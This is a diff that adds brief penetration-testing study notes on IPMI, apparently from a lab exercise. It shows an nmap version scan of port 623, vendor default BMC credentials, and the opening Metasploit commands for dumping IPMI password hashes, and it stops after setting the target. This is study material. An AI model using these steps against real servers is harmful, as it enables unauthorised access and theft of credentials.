@@ -1,0 +1,12 @@
+sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local :- Enum to get the version 
+
+
+Some default credentials for this are as shown below 
+Product	                   Username	                Password
+Dell iDRAC	               root	                    calvin
+HP iLO	                   Administrator	          randomized 8-character string consisting of numbers and uppercase letters
+Supermicro IPMI	           ADMIN	                  ADMIN
+
+We can run the below Metaspoit to get the password HASH saved in server.
+msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts <IP Address>
